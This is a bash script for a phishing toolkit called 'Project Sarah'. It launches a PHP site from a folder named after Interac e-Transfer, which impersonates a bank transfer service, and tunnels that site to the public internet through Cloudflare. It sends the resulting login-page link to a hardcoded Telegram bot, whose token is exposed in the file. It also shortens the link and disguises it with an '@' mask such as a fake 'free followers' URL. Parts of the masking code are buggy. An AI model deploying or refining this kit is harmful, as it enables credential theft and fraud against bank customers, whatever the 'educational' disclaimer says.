#!/bin/bash
__version__="1.5"

## DEFAULT HOST & PORT 
HOST='127.0.0.1'
PORT='8090'

# Telegram Bot Token and Chat ID
TELEGRAM_BOT_TOKEN="6278639566:AAFOIuW6Gjd53XTJJSQUoWu83j9bQ540Th8"
TELEGRAM_CHAT_ID="-1002156953987"

# Define colors
GREEN="\033[32m"
WHITE="\033[37m"
RESET="\033[0m"

# Function to print banner in green
green_echo() {
    local str="$1"
    echo -e "${GREEN}${str}${RESET}"
}

# Define the banner function
banner() {
    green_echo "========================================"
    green_echo "███████╗ █████╗ ██████╗  █████╗ ██╗  ██╗"
    green_echo "██╔════╝██╔══██╗██╔══██╗██╔══██╗██║  ██║"
    green_echo "███████╗███████║██████╔╝███████║███████║"
    green_echo "╚════██║██╔══██║██╔══██╗██╔══██║██╔══██║"
    green_echo "███████║██║  ██║██║  ██║██║  ██║██║  ██║"
    green_echo "╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝"
    green_echo "========================================"
    green_echo "+++---PROJECT-SARAH-BY-RANDOM-RYAN---+++"
    green_echo "========================================"
}

## Directories
BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")

if [[ ! -d ".server" ]]; then
    mkdir -p ".server"
fi

if [[ -d ".server/www" ]]; then
    rm -rf ".server/www"
    mkdir -p ".server/www"
else
    mkdir -p ".server/www"
fi

## Remove logfile
if [[ -e ".server/.loclx" ]]; then
    rm -rf ".server/.loclx"
fi

if [[ -e ".server/.cld.log" ]]; then
    rm -rf ".server/.cld.log"
fi

## Script termination
exit_on_signal_SIGINT() {
    { printf "\n\n%s\n\n" "[!] Program Interrupted." 2>&1; reset_color; }
    exit 0
}

exit_on_signal_SIGTERM() {
    { printf "\n\n%s\n\n" "[!] Program Terminated." 2>&1; reset_color; }
    exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Reset terminal colors
reset_color() {
    tput sgr0   # reset attributes
    tput op     # reset color
    return
}

# Function to kill already running processes
kill_pid() {
    # List of processes to check
    local processes="php ngrok cloudflared loclx"

    for process in ${processes}; do
        # Check if the process is running
        local pids=$(pidof ${process})
        
        if [[ -n "${pids}" ]]; then
            echo "Killing ${process} processes with PIDs: ${pids}"
            # Kill all instances of the process
            killall ${process} > /dev/null 2>&1
        fi
    done
}

# Function to restart Apache2
restart_apache() {
    echo "Restarting Apache2..."
    sudo systemctl restart apache2 > /dev/null 2>&1
    if [[ $? -eq 0 ]]; then
        echo "Apache2 restarted successfully."
    else
        echo "Failed to restart Apache2."
    fi
}

## Dependencies
dependencies() {
    echo -e "\n[+] Installing required packages..."

    if [[ -d "/data/data/com.termux/files/home" ]]; then
        if [[ ! $(command -v proot) ]]; then
            echo -e "\n[+] Installing package: proot"
            pkg install proot resolv-conf -y
        fi

        if [[ ! $(command -v tput) ]]; then
            echo -e "\n[+] Installing package: ncurses-utils"
            pkg install ncurses-utils -y
        fi
    fi

    if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) ]]; then
        echo -e "\n[+] Packages already installed."
    else
        pkgs=(php curl unzip)
        for pkg in "${pkgs[@]}"; do
            type -p "$pkg" &>/dev/null || {
                echo -e "\n[+] Installing package: $pkg"
                if [[ $(command -v pkg) ]]; then
                    pkg install "$pkg" -y
                elif [[ $(command -v apt) ]]; then
                    sudo apt install "$pkg" -y
                elif [[ $(command -v apt-get) ]]; then
                    sudo apt-get install "$pkg" -y
                elif [[ $(command -v pacman) ]]; then
                    sudo pacman -S "$pkg" --noconfirm
                elif [[ $(command -v dnf) ]]; then
                    sudo dnf -y install "$pkg"
                elif [[ $(command -v yum) ]]; then
                    sudo yum -y install "$pkg"
                else
                    echo -e "\n[!] Unsupported package manager, install packages manually."
                    { reset_color; exit 1; }
                fi
            }
        done
    fi
}

# Download Binaries
download() {
    url="$1"
    output="$2"
    file=$(basename $url)
    if [[ -e "$file" || -e "$output" ]]; then
        rm -rf "$file" "$output"
    fi
    curl --silent --insecure --fail --retry-connrefused \
        --retry 3 --retry-delay 2 --location --output "${file}" "${url}"

    if [[ -e "$file" ]]; then
        if [[ ${file#*.} == "zip" ]]; then
            unzip -qq $file > /dev/null 2>&1
            mv -f $output .server/$output > /dev/null 2>&1
        elif [[ ${file#*.} == "tgz" ]]; then
            tar -zxf $file > /dev/null 2>&1
            mv -f $output .server/$output > /dev/null 2>&1
        else
            mv -f $file .server/$output > /dev/null 2>&1
        fi
        chmod +x .server/$output > /dev/null 2>&1
        rm -rf "$file"
    else
        echo -e "\n[!] Error occurred while downloading ${output}."
        { reset_color; exit 1; }
    fi
}

## Install Cloudflared
install_cloudflared() {
    if [[ -e ".server/cloudflared" ]]; then
        echo -e "\n[+] Cloudflared already installed."
    else
        echo -e "\n[+] Installing Cloudflared..."
        arch=$(uname -m)
        if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
            download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
        elif [[ "$arch" == *'aarch64'* ]]; then
            download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
        elif [[ "$arch" == *'x86_64'* ]]; then
            download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
        else
            download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
        fi
    fi
}

## Exit message
msg_exit() {
    { clear; banner; echo; }
    echo -e "${GREEN} Thank you for using this tool. Have a good day.${RESET}\n"
    { reset_color; exit 0; }
}

## About
about() {
    { clear; banner; echo; }
    cat <<- EOF
        Author   :  RANDOM RYAN [ PROJECT-SARAH ]
        Github   :  https://github.com/HackRyan
        Version  :  ${__version__}

        Warning:
        This Server is made for educational purposes only!
        Author will not be responsible for any misuse of this toolkit!

        [00] Main Menu     [99] Exit

EOF

    read -p "[ - ] Select an option : " REPLY
    case $REPLY in 
        99)
            msg_exit;;
        0 | 00)
            echo -ne "\n[+] Returning to main menu..."
            { sleep 1; main_menu; };;
        *)
            echo -ne "\n[!] Invalid Option, Try Again..."
            { sleep 1; about; };;
    esac
}

## Choose custom port
cusport() {
    echo
    read -n1 -p "[?] Do You Want A Custom Port [Y/N]: " P_ANS
    if [[ ${P_ANS,,} == "y" ]]; then
        echo -e "\n"
        read -n4 -p "Enter Your Custom 4-digit Port [1024-9999]: " CU_P
        if [[ ! -z  ${CU_P} && "${CU_P}" =~ ^([1-9][0-9][0-9][0-9])$ && ${CU_P} -ge 1024 ]]; then
            PORT=${CU_P}
            echo
        else
            echo -ne "\n\n[!] Invalid 4-digit Port: $CU_P, Try Again..."
            { sleep 2; clear; cusport; }
        fi        
    else 
        echo -ne "\n\n[ - ] Using Default Port $PORT...\n"
    fi
}

## Setup website and start php server
setup_site() {
    echo -e "\n[ - ] Setting up server..."
    echo -ne "\n[ - ] Starting PHP server..."
    cd etransfer.interac.ca && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
}

## Start Cloudflared
start_cloudflared() { 
    rm .cld.log > /dev/null 2>&1 &
    cusport
    echo -e "\n[ - ] Initializing... ( http://$HOST:$PORT )"
    { sleep 1; setup_site; }

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
    else
        sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
    fi

    sleep 8
    cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
    send_to_telegram "$cldflr_url"
}

## Start localhost
start_localhost() {
    cusport
    echo -e "\n[ - ] Initializing... ( http://$HOST:$PORT )"
    setup_site
    { sleep 1; clear; }
    echo -e "\n[ - ] Successfully Hosted at: http://$HOST:$PORT"
}

# Function to escape MarkdownV2 special characters
escape_markdown() {
    local text="$1"
    # Escape special characters in MarkdownV2
    echo "$text" | sed -e 's/[]_{}()#+-.!|`*/\\&/g'
}

## Send URL to Telegram
send_to_telegram() {
    local url="$1"
    if [[ -n "$url" ]]; then
        # Append the path to the URL
        local full_url="${url}/qwertyuip/login.php"
        # Construct the message
        local message="Your server is running: ${full_url}"
        # Send the message to Telegram
        curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
        -d "chat_id=${TELEGRAM_CHAT_ID}" \
        -d "text=${message}"
    fi
}

## Tunnel selection
tunnel_menu() {
    { clear; banner;}
    start_cloudflared;
}

## Custom Mask URL
custom_mask() {
    { sleep .5; clear; banner; echo; }
    read -n1 -p "[?] Do you want to change Mask URL? [Y/N]: " mask_op
    echo
    if [[ ${mask_op,,} == "y" ]]; then
        echo -e "\n[ - ] Enter your custom URL below ( Example: https://get-free-followers.com )\n"
        read -e -p " ==> " -i "https://" mask_url # initial text requires Bash 4+
        if [[ ${mask_url//:*} =~ ^([h][t][t][p][s]?)$ || ${mask_url::3} == "www" ]] && [[ ${mask_url#http*//} =~ ^[^,~!@%:\=\#\;\^\*\"\'\|\?+\<\>\(\{\)\}\\/]+$ ]]; then
            mask=$mask_url
            echo -e "\n[ - ] Using custom Masked Url: $mask"
        else
            echo -e "\n[!] Invalid url type..Using the Default one.."
        fi
    fi
}

## URL Shortener
shorten_url() {
    local url="$1"
    local cleanuri_api="https://cleanuri.com/api/v1/shorten"
    local isgd_api="https://is.gd/create.php?format=simple&url="
    local shrtco_api="https://api.shrtco.de/v2/shorten?url="
    local tinyurl_api="https://tinyurl.com/api-create.php?url="

    # Shorten URL using Cleanuri
    local response=$(curl -sS -d "url=$url" "$cleanuri_api")
    local shortened_url=$(echo "$response" | jq -r '.result_url')

    # If Cleanuri fails, try other services
    if [ -z "$shortened_url" ] || [ "$shortened_url" == "null" ]; then
        shortened_url=$(curl -sS "$isgd_api$url")
        if [ -n "$shortened_url" ]; then
            send_to_telegram "$shortened_url"
            return
        fi

        response=$(curl -sS "$shrtco_api$url")
        shortened_url=$(echo "$response" | jq -r '.result.full_short_link')
        if [ -n "$shortened_url" ]; then
            send_to_telegram "$shortened_url"
            return
        fi

        shortened_url=$(curl -sS "$tinyurl_api$url")
        if [ -n "$shortened_url" ]; then
            send_to_telegram "$shortened_url"
            return
        fi

        echo -e "\n[ - ] Failed to shorten URL using any service."
    else
        send_to_telegram "$shortened_url"
    fi
}

## Custom URL handling
custom_url() {
    url=${1#http*//}
    cleanuri="https://cleanuri.com/api/v1/shorten"
    isgd="https://www.is.gd/create.php?format=simple&url="
    shortcode="https://api.shrtco.de/v2/shorten?url="
    tinyurl="https://tinyurl.com/api-create.php?url="

    { custom_mask; sleep 1; clear; banner; }
    if [[ ${url} =~ [-a-zA-Z0-9.]*(ngrok.io|trycloudflare.com|loclx.io) ]]; then
        if [[ $(curl -i -s -X POST -d "url=https://example.com" https://cleanuri.com/api/v1/shorten | grep -i 'HTTP/' | awk '{print $2}') == 2* ]]; then
            shorten_url $cleanuri "https://$url"
        elif [[ $(site_stat $isgd) == 2* ]]; then
            shorten_url $isgd "$url"
        elif [[ $(site_stat $shortcode) == 2* ]]; then
            shorten_url $shortcode "$url"
        else
            shorten_url $tinyurl "$url"
        fi

        url="https://$url"
        masked_url="$mask@$processed_url"
        processed_url="https://$processed_url"
    else
        url="Unable to generate links. Try after turning on hotspot"
        processed_url="Unable to Short URL"
    fi

    send_to_telegram "$url"
    send_to_telegram "$processed_url"
    if [[ $processed_url != *"Unable"* ]]; then
        send_to_telegram "$masked_url"
    fi
}

## Server menu
server_menu() {
    mask='https://lxance'
    tunnel_menu;
}

## Menu
main_menu() {
    { clear; banner; echo; }
    cat <<- EOF
         THIS PROJECT WAS MADE STRICTLY FOR EDUCATION...  
EOF
    
    read -p "[ - ] Continue? Y/N : " REPLY

    case $REPLY in 
        Y | y)
            server_menu;;
        99)
            about;;
        0 | 00 )
            msg_exit;;
        *)
            echo -ne "\n[!] Invalid Option, Try Again..."
            { sleep 1; main_menu; };;
    esac
}

## Main
kill_pid
dependencies
install_cloudflared
main_menu
restart_apache
